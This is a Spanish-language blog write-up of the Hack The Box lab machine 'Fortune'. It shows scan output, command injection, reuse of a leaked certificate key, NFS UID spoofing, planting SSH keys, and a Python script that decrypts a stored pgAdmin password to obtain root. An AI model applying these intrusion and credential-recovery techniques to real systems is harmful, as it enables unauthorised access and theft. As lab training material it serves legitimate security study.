<!DOCTYPE html>
<html lang="en">
<head>
  
    <title>Hack The Box - Fortune :: sckull — HackTheBox Writeups, CTF</title>
  
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
<meta name="description" content="Nombre Fortune     OS Otro   Puntos 50   Dificultad Dificil   IP 10.10.10.127   Maker AuxSarge      new Chart(document.getElementById(&#34;radar-chart&#34;), { type: &#39;radar&#39;, data: { labels: [&#34;Enumeration&#34;, &#34;Real-Life&#34;, &#34;CVE&#34;, &#34;Custom Exploitation&#34;, &#34;CTF-Like&#34;], datasets: [ { label: &#34;User&#34;, fill: true, backgroundColor: &#34;rgba(179,181,198,0.2)&#34;, borderColor: &#34;rgba(179,181,198,1)&#34;, pointBorderColor: &#34;#fff&#34;, pointBackgroundColor: &#34;rgba(179,181,198,1)&#34;, data: [8.1, 7.7, 4.2, 5.8, 2.3] }, { label: &#34;"/>
<meta name="keywords" content=""/>
<meta name="robots" content="noodp"/>
<link rel="canonical" href="https://sckull.github.io/posts/fortune/" />


<link rel="stylesheet" href="https://sckull.github.io/assets/style.css">


<link rel="stylesheet" href="https://sckull.github.io/style.css">


<link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://sckull.github.io/img/apple-touch-icon-144-precomposed.png">
<link rel="shortcut icon" href="https://sckull.github.io/img/favicon.png">


<meta name="twitter:card" content="summary" />
<meta name="twitter:title" content="Hack The Box - Fortune :: sckull — HackTheBox Writeups, CTF" />
<meta name="twitter:description" content="Nombre Fortune     OS Otro   Puntos 50   Dificultad Dificil   IP 10.10.10.127   Maker AuxSarge      new Chart(document.getElementById(&#34;radar-chart&#34;), { type: &#39;radar&#39;, data: { labels: [&#34;Enumeration&#34;, &#34;Real-Life&#34;, &#34;CVE&#34;, &#34;Custom Exploitation&#34;, &#34;CTF-Like&#34;], datasets: [ { label: &#34;User&#34;, fill: true, backgroundColor: &#34;rgba(179,181,198,0.2)&#34;, borderColor: &#34;rgba(179,181,198,1)&#34;, pointBorderColor: &#34;#fff&#34;, pointBackgroundColor: &#34;rgba(179,181,198,1)&#34;, data: [8.1, 7.7, 4.2, 5.8, 2.3] }, { label: &#34;" />
<meta name="twitter:site" content="https://sckull.github.io" />
<meta name="twitter:creator" content="sckull" />
<meta name="twitter:image" content="https://sckull.github.io/../../image/htb/fortune/cover.png">


<meta property="og:locale" content="en" />
<meta property="og:type" content="article" />
<meta property="og:title" content="Hack The Box - Fortune :: sckull — HackTheBox Writeups, CTF">
<meta property="og:description" content="Nombre Fortune     OS Otro   Puntos 50   Dificultad Dificil   IP 10.10.10.127   Maker AuxSarge      new Chart(document.getElementById(&#34;radar-chart&#34;), { type: &#39;radar&#39;, data: { labels: [&#34;Enumeration&#34;, &#34;Real-Life&#34;, &#34;CVE&#34;, &#34;Custom Exploitation&#34;, &#34;CTF-Like&#34;], datasets: [ { label: &#34;User&#34;, fill: true, backgroundColor: &#34;rgba(179,181,198,0.2)&#34;, borderColor: &#34;rgba(179,181,198,1)&#34;, pointBorderColor: &#34;#fff&#34;, pointBackgroundColor: &#34;rgba(179,181,198,1)&#34;, data: [8.1, 7.7, 4.2, 5.8, 2.3] }, { label: &#34;" />
<meta property="og:url" content="https://sckull.github.io/posts/fortune/" />
<meta property="og:site_name" content="Hack The Box - Fortune" />
<meta property="og:image" content="https://sckull.github.io/../../image/htb/fortune/cover.png">
<meta property="og:image:width" content="2048">
<meta property="og:image:height" content="1024">

<meta name="google-site-verification" content="cug_0s4kFi5UbEfBI5hJsscmJ7XdimqECCYfN1EAZq0" />


<script type="application/ld+json">
    {
        "@context" : "http://schema.org",
        "@type" : "BlogPosting",
        "mainEntityOfPage": {
             "@type": "WebPage",
             "@id": "https://sckull.github.io"
        },
        "articleSection" : "posts",
        "name" : "Hack The Box - Fortune",
        "headline" : "Hack The Box - Fortune",
        "description" : "Nombre Fortune     OS Otro   Puntos 50   Dificultad Dificil   IP 10.10.10.127   Maker AuxSarge      new Chart(document.getElementById("radar-chart"), { type: 'radar', data: { labels: ["Enumeration", "Real-Life", "CVE", "Custom Exploitation", "CTF-Like"], datasets: [ { label: "User", fill: true, backgroundColor: "rgba(179,181,198,0.2)", borderColor: "rgba(179,181,198,1)", pointBorderColor: "#fff", pointBackgroundColor: "rgba(179,181,198,1)", data: [8.1, 7.7, 4.2, 5.8, 2.3] }, { label: "",
        "inLanguage" : "en-US",
        "author" : "",
        "creator" : "",
        "publisher": "",
        "accountablePerson" : "",
        "copyrightHolder" : "",
        "copyrightYear" : "2019",
        "datePublished": "2019-08-03 00:00:00 &#43;0000 UTC",
        "dateModified" : "2019-08-03 00:00:00 &#43;0000 UTC",
        "url" : "https://sckull.github.io/posts/fortune/",
        "wordCount" : "1674",
        "keywords" : [ "hackthebox","masscan","nmap","Blog" ]
    }
    </script>


<meta property="article:published_time" content="2019-08-03 00:00:00 &#43;0000 UTC" />





</head>
<body class="">
<div class="container">
  <header class="header">
  <span class="header__inner">
    <a href="https://sckull.github.io/" class="logo" style="text-decoration: none;">
  
    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" width="44" height="44" viewBox="0 0 44 44">
  <polyline fill="none" stroke="#000" stroke-width="2" points="15 8 29.729 22.382 15 35.367"/>
</svg>
</span>
    <span class="logo__text">sckull | blog</span>
    <span class="logo__cursor"></span>
  
</a>

    <span class="header__right">
      
        <nav class="menu">
  <ul class="menu__inner menu__inner--desktop">
    
      
        
          <li><a href="https://sckull.github.io/about">About</a></li>
        
      
        
          <li><a href="https://sckull.github.io/tags/">Tags</a></li>
        
      
      
    
  </ul>

  <ul class="menu__inner menu__inner--mobile">
    
      
        <li><a href="https://sckull.github.io/about">About</a></li>
      
    
      
        <li><a href="https://sckull.github.io/tags/">Tags</a></li>
      
    
  </ul>
</nav>

        <span class="menu-trigger">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
            <path d="M0 0h24v24H0z" fill="none"/>
            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
          </svg>
        </span>
      
      <span class="theme-toggle">
        <svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
</svg>

      </span>
    </span>
  </span>
  <link rel="shortcut icon" href="https://sckullbock.blogspot.com/favicon.ico">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/Chart.js/2.5.0/Chart.min.js"></script>
</header>

  
  <div class="content">    
    
  <div class="post">
    <h2 class="post-title"><a href="https://sckull.github.io/posts/fortune/">Hack The Box - Fortune</a></h2>
    <div class="post-meta">
      
        <span class="post-date">
            Saturday, Aug 3, 2019
        </span>
      
      <span class="post-author">— Written by sckull</span>
      
    </div>
        
    
      <span class="post-tags">Tags:
        
         #<a href="https://sckull.github.io/tags/hackthebox/">hackthebox</a>&nbsp;
        
         #<a href="https://sckull.github.io/tags/masscan/">masscan</a>&nbsp;
        
         #<a href="https://sckull.github.io/tags/nmap/">nmap</a>&nbsp;
        
      </span>
    

    
      
        <img src="https://sckull.github.io/posts/fortune/../../image/htb/fortune/cover.png" class="post-cover" />
      
      <hr />
     
    
    <div class="post-content">      
      

<table>
<thead>
<tr>
<th>Nombre</th>
<th>Fortune</th>
</tr>
</thead>

<tbody>
<tr>
<td>OS</td>
<td>Otro</td>
</tr>

<tr>
<td>Puntos</td>
<td>50</td>
</tr>

<tr>
<td>Dificultad</td>
<td>Dificil</td>
</tr>

<tr>
<td>IP</td>
<td>10.10.10.127</td>
</tr>

<tr>
<td>Maker</td>
<td><a href="https://www.hackthebox.eu/home/users/profile/46317">AuxSarge</a></td>
</tr>
</tbody>
</table>

<div id="grapher"><canvas id="radar-chart" width="100" height="50"></canvas>
    <script>
    new Chart(document.getElementById("radar-chart"), {
    type: 'radar',
    data: {
      labels: ["Enumeration", "Real-Life", "CVE", "Custom Exploitation", "CTF-Like"],
      datasets: [
        {
          label: "User",
          fill: true,
          backgroundColor: "rgba(179,181,198,0.2)",
          borderColor: "rgba(179,181,198,1)",
          pointBorderColor: "#fff",
          pointBackgroundColor: "rgba(179,181,198,1)",
          data: [8.1, 7.7, 4.2, 5.8, 2.3]
        }, {
          label: "Maker",
          fill: true,
          backgroundColor: "rgba(255,99,132,0.2)",
          borderColor: "rgba(255,99,132,1)",
          pointBorderColor: "#fff",
          pointBackgroundColor: "rgba(255,99,132,1)",
          pointBorderColor: "#fff",
          data: [8, 9, 1, 9, 1]
        }
      ]
    },
    options: {
      title: {
        display: true,
        text: 'Calificacion'
      }
    }
});
    </script>
</div>

<hr />

<hr />

<h2 id="nmap">NMAP</h2>

<p>Al realizar un escaneo con nmap.</p>

<pre><code class="language-bash"># Nmap 7.70 scan initiated Wed Mar 13 22:48:02 2019 as: nmap -sV -sC -A -o nmap.scan 10.10.10.127
Nmap scan report for 10.10.10.127
Host is up (0.17s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE    VERSION
22/tcp  open  ssh        OpenSSH 7.9 (protocol 2.0)
| ssh-hostkey: 
|   2048 07:ca:21:f4:e0:d2:c6:9e:a8:f7:61:df:d7:ef:b1:f4 (RSA)
|   256 30:4b:25:47:17:84:af:60:e2:80:20:9d:fd:86:88:46 (ECDSA)
|_  256 93:56:4a:ee:87:9d:f6:5b:f9:d9:25:a6:d8:e0:08:7e (ED25519)
80/tcp  open  http       OpenBSD httpd
|_http-server-header: OpenBSD httpd
|_http-title: Fortune
443/tcp open  ssl/https?
|_ssl-date: TLS randomness does not represent time
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.70%E=4%D=3/13%OT=22%CT=1%CU=40048%PV=Y%DS=2%DC=T%G=Y%TM=5C89893
OS:B%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=10D%TI=RD%CI=RI%TS=22)OPS(O
OS:1=M54DNNSNW6NNT11%O2=M54DNNSNW6NNT11%O3=M54DNW6NNT11%O4=M54DNNSNW6NNT11%
OS:O5=M54DNNSNW6NNT11%O6=M54DNNSNNT11)WIN(W1=4000%W2=4000%W3=4000%W4=4000%W
OS:5=4000%W6=4000)ECN(R=Y%DF=Y%T=40%W=4000%O=M54DNNSNW6%CC=N%Q=)T1(R=Y%DF=Y
OS:%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=S%F
OS:=AR%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=A%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y
OS:%T=40%W=0%S=A%A=S%F=AR%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=FF%IPL=38%UN=0%RI
OS:PL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=N)
</code></pre>

<h2 id="https">HTTPS</h2>

<p>Al visitar la pagina nos encontramos con lo siguiente, por lo que no podemos hacer nada por ahora.
<img src="../../image/htb/fortune/Screenshot from 2019-03-19 16-51-49.png" alt="image" /></p>

<h2 id="http">HTTP</h2>

<p>Con gobuster encontramos la siguiente ruta.</p>

<pre><code class="language-bash">/fortune (Status: 301)
</code></pre>

<p>Utilizamos firefox para ver las peticiones que hace cuando enviamos una solicitud a una de las opciones, en cada opcion si se hace una peticion este nos devuelve de manera aleatoria un mensaje.</p>

<p><img src="../../image/htb/fortune/Screenshot from 2019-03-18 15-20-59.png" alt="image" />
<img src="../../image/htb/fortune/Screenshot from 2019-03-18 15-21-43.png" alt="image" /></p>

<p>Y encontramos que, al editar las peticiones (<code>POST db=fortunes</code>), encontramos que podemos ejecutar comandos (RCE):</p>

<p><img src="../../image/htb/fortune/Screenshot from 2019-03-18 15-23-21.png" alt="image" /></p>

<p>Al realizar una enumeracion de carpeta y archivos encontramos en la carpeta del usuario <code>bob</code> (<code>/home/bob/</code>) certificados que pueden pertenecen a la pagina web https.</p>

<pre><code class="language-bash">/home/bob
├── ca
│   ├── certs
│   │   └── ca.cert.pem
│   ├── crl
│   ├── index.txt
│   ├── index.txt.attr
│   ├── index.txt.old
│   ├── intermediate
│   │   ├── certs
│   │   │   ├── ca-chain.cert.pem
│   │   │   ├── fortune.htb.cert.pem
│   │   │   └── intermediate.cert.pem
│   │   ├── crl
│   │   ├── crlnumber
│   │   ├── csr
│   │   │   ├── fortune.htb.csr.pem
│   │   │   └── intermediate.csr.pem
│   │   ├── index.txt
│   │   ├── index.txt.attr
│   │   ├── newcerts
│   │   │   └── 1000.pem
│   │   ├── openssl.cnf
│   │   ├── private
│   │   │   ├── fortune.htb.key.pem
│   │   │   └── intermediate.key.pem
│   │   ├── serial
│   │   └── serial.old
│   ├── newcerts
│   │   └── 1000.pem
│   ├── openssl.cnf
│   ├── private [error opening dir]
│   ├── serial
│   └── serial.old
└── dba
    └── authpf.sql
</code></pre>

<p>La razon por la cual no podamos acceder a la pagina https es porque no tenemos el certificado de la misma, esta es una grafica de como funciona un certificado.</p>

<p><a href="https://www.certsuperior.com/QueesunCertificadoSSL.aspx"><strong>certsuperior - Certificados</strong></a></p>

<p><a href="https://docs.oracle.com/cd/E19226-01/820-7627/bncbs/index.html"><strong>Oracle - certificados</strong></a></p>

<p><img src="https://docs.oracle.com/cd/E19226-01/820-7627/images/security-sslBMAWithCertificates.gif" alt="IMAGE" /></p>

<p>Para poder acceder a la pagina debemos de crear nuestro archivo <code>pkc12</code> el cual contiene el certificado y la clave, copiamos a nuestra maquina local los archivos <code>intermediate.cert.pem</code> e <code>intermediate.key.pem</code>, utilizando openssl generamos el certificado con el siguiente comando:</p>

<p><a href="https://www.ssl.com/how-to/create-a-pfx-p12-certificate-file-using-openssl/"><strong>ssl - Certificate File</strong></a></p>

<p><a href="https://www.ibm.com/support/knowledgecenter/en/SSPH29_9.0.1/com.ibm.help.common.infocenter.aps/t_ConvertthepfxCertificatetopemFormat068.html"><strong>ibm - Certificate</strong></a></p>

<pre><code class="language-bash">openssl pkcs12 -export -out cert.p12 -in intermediate.cert.pem -inkey intermediate.key.pem -passin pass:root -passout pass:root
</code></pre>

<p><img src="../../image/htb/fortune/Screenshot from 2019-03-19 17-26-46.png" alt="image" /></p>

<p>Obtenemos el certificado y lo importamos a nuestro navegador en las configuraciones de certificado.</p>

<p><img src="../../image/htb/fortune/Screenshot from 2019-03-19 19-31-53.png" alt="image" /></p>

<p>Visitamos la pagina en https y nos muestra lo siguiente:</p>

<p><img src="../../image/htb/fortune/Screenshot from 2019-03-19 19-33-16.png" alt="image" /></p>

<p><img src="../../image/htb/fortune/Screenshot from 2019-03-19 19-34-46.png" alt="image" /></p>

<p>Al visitar la pagina <code>/generate</code> nos muestra una clave publica agregada al los archivos de autorizacion ssh de la maquina y una clave privada con la cual nos podemos conectar al mismo.</p>

<p><img src="../../image/htb/fortune/Screenshot from 2019-03-19 19-35-47.png" alt="image" /></p>

<p>Nos conectamos al servicio ssh con la clave generada y el usuario <code>nfsuser</code>, nos muestra el siguiente mensaje, pero nuestra shell no es interactiva:</p>

<p><img src="../../image/htb/fortune/Screenshot from 2019-03-20 22-31-02.png" alt="image" /></p>

<p>Al revisar los procesos que corren en la maquina nos muestra un servicio de <strong>authpf</strong>:</p>

<p><img src="../../image/htb/fortune/Screenshot from 2019-03-20 22-37-18.png" alt="image" /></p>

<p>Segun la documentacion de openbsd sobre Authpf nos dice que <strong>&ldquo;es un intérprete (shell) para pasarelas de autenticación. Una pasarela de autenticación es como una pasarela de red normal (también llamada enrutador), con la diferencia que &ldquo;los usuarios se deben autenticar ante la pasarela&rdquo; antes de que se permita que pase el tráfico a través de ésta&rdquo;</strong>.</p>

<p><a href="https://www.openbsd.org/faq/pf/authpf.html#loginclass"><strong>openbsd - authpf</strong></a></p>

<p><a href="https://home.nuug.no/~peter/pf/blug2011/authpf.html"><strong>autphf - español</strong></a></p>

<p>Las reglas de authpf <code>/etc/authpf/authpf.rules</code> nos muestran que cualquier usuario ip (<code>$user_ip</code>) en este caso <code>nfsuser</code> le de paso o permiso en los protocolos tcp udp.</p>

<pre><code class="language-bash">ext_if = &quot;em0&quot;
pass in quick on $ext_if inet proto { tcp udp } from $user_ip to ($ext_if) keep state
</code></pre>

<p>Sabiendo que tenemos acceso a los protocolos tcp y udp volvemos a hacer un escaneo de puertos y encontramos los siguientes puertos abiertos:</p>

<pre><code class="language-bash">Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-21 04:58 GMT
Nmap scan report for 10.10.10.127
Host is up (0.18s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.9 (protocol 2.0)
80/tcp   open  http       OpenBSD httpd
111/tcp  open  rpcbind    2 (RPC #100000)
443/tcp  open  ssl/https?
2049/tcp open  nfs        2-3 (RPC #100003)
8081/tcp open  http       OpenBSD httpd

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 38.31 seconds
</code></pre>

<p>Encontramos que hay un servicio rpcbind y nfs que estan corriendo en la maquina, escaneamos el servicio <code>rpcbind</code>:</p>

<h2 id="rpcbind">RPCBIND</h2>

<p>Encontramos que el servicio NFS esta corriendo tanto en tcp y udp, por lo que podemos montar los share name de la maquina localmente.</p>

<pre><code class="language-bash">root@sckull:~/htb/fortune# rpcinfo -p 10.10.10.127
   program vers proto   port  service
    100000    2   tcp    111  portmapper
    100000    2   udp    111  portmapper
    100005    1   udp    694  mountd
    100005    3   udp    694  mountd
    100005    1   tcp    944  mountd
    100005    3   tcp    944  mountd
    100003    2   udp   2049  nfs
    100003    3   udp   2049  nfs
    100003    2   tcp   2049  nfs
    100003    3   tcp   2049  nfs
root@sckull:~/htb/fortune# 
</code></pre>

<h2 id="nfs">NFS</h2>

<p>Al revisar los puntos compartidos obtenemos que <code>/home</code> puede ser montado</p>

<pre><code class="language-bash">root@sckull:~/htb/fortune# showmount -e 10.10.10.127
Export list for 10.10.10.127:
/home (everyone)
root@sckull:~/htb/fortune# 
</code></pre>

<h3 id="acceso-a-home">ACCESO a /home</h3>

<p>Para acceder a la carpeta <code>/home</code> debemos montarlo localmente y asi poder acceder a las carpetas y archivos que se encuentran dentro.</p>

<pre><code class="language-shell">root@sckull:~/htb/fortune# mkdir tmp_nfs
root@sckull:~/htb/fortune# mount -t nfs 10.10.10.127:/home /root/htb/fortune/tmp_nfs
root@sckull:~/htb/fortune# ls tmp_nfs/
bob  charlie  nfsuser
</code></pre>

<p>Observamos que hay tres usuarios de los cuales bob ya conocemos su interior, mas no el de charlie y <strong>nfsuser:</strong></p>

<pre><code class="language-bash">root@sckull:~/htb/fortune# ls -lah tmp_nfs/nfsuser/
total 16K
drwxr-xr-x 2 1002 1002 512 Nov  3 02:39 .
drwxr-xr-x 5 root root 512 Nov  3 01:19 ..
-rw-r--r-- 1 1002 1002 771 Oct 11 20:18 .cshrc
-rw-r--r-- 1 1002 1002 101 Oct 11 20:18 .cvsrc
-rw-r--r-- 1 1002 1002 359 Oct 11 20:18 .login
-rw-r--r-- 1 1002 1002 175 Oct 11 20:18 .mailrc
-rw-r--r-- 1 1002 1002 215 Oct 11 20:18 .profile
-rw-r--r-- 1 1002 1002  87 Oct 11 20:18 .Xdefaults
root@sckull:~/htb/fortune# ls -lah tmp_nfs/charlie/
ls: cannot open directory 'tmp_nfs/charlie/': Permission denied
root@sckull:~/htb/fortune# 
</code></pre>

<p>Podemos ver que a la carpeta del usuario charlie no tenemos acceso, para ello vamos a crear un usuario localmente y un grupo para poder acceder al interior, utilizamos stat para ver informacion de la carpeta, con lo cual vemos que <code>/home/charlie</code> tiene propiedades <code>uid: 1000 y gid:1000</code>.</p>

<pre><code class="language-bash">root@sckull:~/htb/fortune# stat tmp_nfs/charlie/
  File: tmp_nfs/charlie/
  Size: 512       	Blocks: 4          IO Block: 32768  directory
Device: 31h/49d	Inode: 27648       Links: 3
Access: (0750/drwxr-x---)  Uid: ( 1000/ UNKNOWN)   Gid: ( 1000/ UNKNOWN)
Access: 2019-03-21 05:17:35.827314870 +0000
Modify: 2019-03-21 05:33:05.655948328 +0000
Change: 2019-03-21 05:33:05.655948328 +0000
 Birth: -
</code></pre>

<p>Creamos un usuario y grupo local para charlie:</p>

<pre><code class="language-bash">root@kali:~# groupadd --gid 1000 charlie_group
root@kali:~# useradd --uid 1000 --groups charlie_group charlie_user
root@kali:~# sudo -u charlie_user ls -l tmp_nfs/charlie
</code></pre>

<p>Con ello logramos acceder y obtener tambien nuestra bandera <code>user.txt</code>.</p>

<p><img src="../../image/htb/fortune/Screenshot from 2019-03-20 23-43-48.png" alt="image" /></p>

<p><img src="../../image/htb/fortune/Screenshot from 2019-03-20 23-45-14.png" alt="image" /></p>

<p>Ahora que tenemos acceso a la carpeta de charlie podemos agregar nuestra clave ssh a <code>authorized_keys</code> para poder logearnos con el servicio ssh como charlie.</p>

<p><img src="../../image/htb/fortune/Screenshot from 2019-03-20 23-55-26.png" alt="image" /></p>

<p>De la misma forma para el usuario bob:</p>

<p><img src="../../image/htb/fortune/Screenshot from 2019-03-21 00-50-59.png" alt="image" /></p>

<h2 id="escalacion-de-privilegios">ESCALACION DE PRIVILEGIOS</h2>

<p>Dentro de la carpeta charlie nos encontramos con un archivo <code>mbox</code>, que contiene un mensaje de bob para charlie.</p>

<p><img src="../../image/htb/fortune/Screenshot from 2019-03-20 23-58-14.png" alt="image" /></p>

<p>Nos dice que bob cambio la contraseña para el usuario dba es la misma que la del usuario root, haciendo una enumeracion de carpetas y archivos nos encontramos un archivo <code>pgadmin4.db</code> que contiene tablas que le pertenecen a <code>pgadmin3.4</code>, utilizando sqlite db browser, dentro de este archivo encontramos una contraseña y usuario <code>dba</code> especificamente en la tabla de <code>server</code>, tambien una tabla que contiene usuario y contraseña de bob y charlie.</p>

<p>Ruta del archivo:</p>

<pre><code class="language-bash">/var/appsrv/pgadmin4/pgadmin4.db
</code></pre>

<p><img src="../../image/htb/fortune/Screenshot from 2019-03-22 17-13-19.png" alt="image" /></p>

<p>Tambien encontramos la ruta donde se encuentran los documentos de pgadmin dentro del archivo <code>pgadmin4.ini</code>:</p>

<p><img src="../../image/htb/fortune/Screenshot from 2019-03-22 17-14-06.png" alt="image" /></p>

<p><strong>dba</strong>
<img src="../../image/htb/fortune/Screenshot from 2019-03-22 16-56-18.png" alt="image" /></p>

<p><strong>bob y charlie</strong>
<img src="../../image/htb/fortune/Screenshot from 2019-03-22 16-58-51.png" alt="image" /></p>

<h3 id="usuario-root">Usuario ROOT</h3>

<p>En la ruta de pgadmin4 local (<code>/usr/local/pgadmin4/pgadmin4-3.4/web/utils/)</code>, encontramos un archivo llamado crypto.py, en su interior encontramos funciones las cuales encriptan y desencriptan contraseñas (<code>encrypt(), decrypt(), pad(), pqencryptpassword()</code>), la funcion de <code>encrypt()</code> necesita un texto y una clave, la funcion <code>decrypt()</code> el texto encriptado (<code>ciphertext</code>) anteriormente con la funcion <code>encrypt()</code> y la clave, con estas dos funciones y la contraseña que se encuentra en la tabla de server del usuario <code>dba</code>, podemos intentar desencriptarla solo nos falta la clave (key).</p>

<p>Dentro de la base de datos (pgadmin4.db) encontramos algunas claves (tabla -&gt; keys) que podriamos utilizar para la funcion decrypt(), de igual forma los usuarios (tabla -&gt; users) y contraseñas (tabla -&gt; users).</p>

<p>Localmente agregamos el siguiente codigo a nuestro archivo crypto.py:</p>

<pre><code class="language-python">if __name__ == '__main__':

    list_keys = ['root','operator','www','postgresql','pgadmin4','fortune','charlie',
                  'bob','nfsuser','authpf','admin','administrator','pgadmin3','Administrator','bob@fortune.htb',
                  'charlie@fortune.htb','user','saQWKx5BCyVZMH2weOiNv3Dsvzh4GchPM16kwBRYPxs=',
                  'R_EFY1hb236guS3jNq1aHyPcruXbjk7Ff-QwL6PMqJM=','qIhAhRt3xq_dzIEqyJQFmWnymFbO1cZVhbQaTWA-v9Q=',
                  'dba','postgres','$pbkdf2-sha512$25000$3hvjXAshJKQUYgxhbA0BYA$iuBYZKTTtTO.cwSvMwPAYlhXRZw8aAn9gBtyNQW3Vge23gNUMe95KqiAyf37.v1lmCunWVkmfr93Wi6.W.UzaQ',
                  '$pbkdf2-sha512$25000$z9nbm1Oq9Z5TytkbQ8h5Dw$Vtx9YWQsgwdXpBnsa8BtO5kLOdQGflIZOQysAy7JdTVcRbv/6csQHAJCAIJT9rLFBawClFyMKnqKNL5t3Le9vg']
    
    pass_dba = &quot;utUU0jkamCZDmqFLOrAuPjFxL0zp8zWzISe5MF0GY/l8Silrmu3caqrtjaVjLQlvFFEgESGz&quot;
    
    for key in list_keys:
        k = str(user)
        r = decrypt(pass_dba, k)
        print(k +' : ' + r)
</code></pre>

<p>Esta porcion de codigo contiene una lista de las claves (keys) probables para la contraseña (<code>pass_dba</code>) del usuario dba que corresponde igualmente para el usuario root, dentro de las claves tambien encontramos usuarios, ya que una key podria ser o no el nombre de un usuario, de igual manera agregamos las contraseñas de la base de datos de los usuarios bob y charlie. En resumen agregamos a la lista todas las posibles claves que encontramos dentro de la maquina. Al correr nuestro script obtenemos el siguente resultado:</p>

<p><img src="../../image/htb/fortune/Screenshot from 2019-03-22 17-39-55.png" alt="image" /></p>

<p>Nuestra contraseña para el usuario dba y para root es <code>R3us3-0f-a-P4ssw0rdl1k3th1s?_B4D.ID3A!</code>, la clave que fue satisfactoria fue una contraseña en este caso la contraseña de bob que se encuentra en la base de datos. Asi obtenemos nuestra bandera <code>root.txt</code>.</p>

<p><img src="../../image/htb/fortune/Screenshot from 2019-03-22 17-42-14.png" alt="image" /></p>

    </div>    
    <hr />
    <div >
      
        
<div id="disqus_thread"></div>
<script>
(function() {
var d = document, s = d.createElement('script');
s.src = 'https://sckull.disqus.com/embed.js';
s.setAttribute('data-timestamp', +new Date());
(d.head || d.body).appendChild(s);
})();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>

      
      
    </div>
    
      <div class="pagination">
        <div class="pagination__title">
          <span class="pagination__title-h">Read other posts</span>
          <hr />
        </div>
        <div class="pagination__buttons">
          
          
            <span class="button next">
              <a href="https://sckull.github.io/posts/lacasadepapel/">
                <span class="button__text">Hack The Box - LaCasaDePapel</span>
                <span class="button__icon">→</span>
              </a>
            </span>
          
        </div>
      </div>
      
    
    
    </div>
    
  </div>
  
  
    <footer class="footer">
  <div class="footer__inner">
    
      <a href="https://sckull.github.io/" class="logo" style="text-decoration: none;">
  
    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" width="44" height="44" viewBox="0 0 44 44">
  <polyline fill="none" stroke="#000" stroke-width="2" points="15 8 29.729 22.382 15 35.367"/>
</svg>
</span>
    <span class="logo__text">sckull | blog</span>
    <span class="logo__cursor"></span>
  
</a>

      <div class="copyright">
        
      </div>
    
  </div>
</footer>

<script src="https://sckull.github.io/assets/main.js"></script>
<script src="https://sckull.github.io/assets/prism.js"></script>


  
</div>

</body>
</html>
